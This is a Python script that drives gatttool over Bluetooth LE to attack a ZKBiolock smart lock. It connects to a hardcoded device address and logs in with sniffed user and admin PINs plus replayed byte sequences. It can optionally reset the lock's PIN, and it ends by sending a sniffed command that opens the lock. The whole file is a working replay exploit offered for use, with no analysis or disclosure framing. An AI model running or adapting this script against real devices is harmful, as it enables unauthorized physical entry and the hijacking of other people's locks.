#!/usr/bin/python
import time
import pexpect

def main():
    # target device MAC
    DEVICE = "08:7C:BE:30:69:31"
    # current pin sniffed
    PAIRING_PSWD = "123456"
    # additional bytes dependent on LOCK_PIN
    PAIRING_ADDTL_BYTES = "5be7"
    # current admin pin sniffed
    SUPER_PSWD = "12345678"
    # additional bytes dependent on ADMIN_PIN
    SUPER_ADDTL_BYTES = "adb6"
    
    # pin to change device to
    NEW_PAIRING_PSWD = ""
    
    print "ZKBiolock address: " , DEVICE
    
    print "Run gatttool..."
    child = pexpect.spawn("gatttool -I")
    
    # Connect to the device.
    connect(child, DEVICE)

    # login to lock
    # handle: 0x001C
    # data: AT+PASSKEY="LOCK_PIN"
    write_char(child, "0x001c", "41542b504153534b45593d" + PAIRING_PSWD.encode("hex") +"0d0a")
    
    # pass fake admin password (we are not logged in as admin yet) and the first three
    # bytes of the 36-byte character string
    # handle: 0x0019
    # data: 0xaa0101 + "1"+ 0x00 + "12312124234" + 0x0a + "C4C"
    write_char(child, "0x0019", "aa0101310031323331323132343233340a433443")
    
    # pass next 20 bytes of the character string
    # handle: 0x0019
    # data: "BCE33-F952-4C58-896D"
    write_char(child, "0x0019", "42433345452d463935322d344335382d38393644")
    
    # pass next 13-bytes of the character string and password dependent 2-bytes
    # handle: 0x0019
    #data: "-0F8BC9691AE" + 0x0a + 0x5be7 + 0x55
    write_char(child, "0x0019", "2d3046384243393536393141450a" + PAIRING_ADDTL_BYTES +"55")
    
    # Log in as admin and send first 6 bytes of 36-byte character string
    # handle: 0x0019
    # data: 0xaa01012e00 + admin pin + 0x0a + "C4CBC3"
    write_char(child, "0x0019", "aa01012e00" + SUPER_PSWD.encode("hex") + "0a433443424333")
    
    # pass next 20 bytes of the character string
    # handle: 0x0019
    # data: "EE-F952-4C58-896D-0F"
    write_char(child, "0x0019", "45452d463935322d344335382d383936442d3046")
    
    # pass next 10 bytes of the 36 character string and password dependent 2-bytes
    # handle: 0x0019
    # data: "8BC95691AE" + 0x0a + 0xadb6 + 0x55
    write_char(child, "0x0019", "384243393536393141450a" + SUPER_ADDTL_BYTES + "55")
    
    # change the pin 
    # handle: 0x001C
    # data: 0x41542b544b3d + new pin + 0d0a 
    if(NEW_PAIRING_PSWD != ""):
        write_char(child, "0x001C", "41542b544b3d" + NEW_PAIRING_PSWD.encode("hex") + "0d0a")

    # Open the lock using handle 0x0019 and sniffed value: 0xaa010505000101000500a7c355
    write_char(child, "0x0019", "aa010505000101000500a7c355")
    
# Connect do device
def connect(child, device):
        print "Connecting to ", device
        child.sendline("connect {0}".format(device))
        child.expect("Connection successful",  timeout=5)
        print "Connected"

# Write characteristic to given handle with given data
def write_char(child, handle, data):
    child.sendline("char-write-req " + handle + " " + data)
    child.expect("Characteristic value was written successfully", timeout=10)
    child.expect("\r\n", timeout=10)
    print "Characteristic value was written successfully"


if __name__ == "__main__":
    main()